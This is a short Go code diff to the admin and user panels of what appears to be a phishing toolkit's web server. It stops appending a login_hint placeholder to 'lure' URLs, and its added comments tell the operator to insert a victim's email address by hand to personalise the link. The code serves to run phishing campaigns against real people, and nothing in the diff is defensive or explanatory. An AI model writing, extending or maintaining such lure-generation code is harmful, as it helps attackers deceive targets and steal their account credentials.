@@ -567,9 +567,8 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 						lureURL = pu
 					}
 				}
-				if lureURL != "" {
-					lureURL += "?login_hint=SILENTCODERSEMAIL"
-				}
+				// lureURL is the clean base URL — no login_hint placeholder here.
+				// To personalize for a specific victim add ?login_hint=email manually.
 
 				lureURLCell := `<span style="color:#383838">—</span>`
 				if lureURL != "" {
@@ -1098,9 +1097,7 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 					lureURL = pu
 				}
 			}
-			if lureURL != "" {
-				lureURL += "?login_hint=SILENTCODERSEMAIL"
-			}
+			// lureURL is the clean base URL — no login_hint placeholder here.
 
 			lureURLCell := `<span style="color:#383838">—</span>`
 			if lureURL != "" {
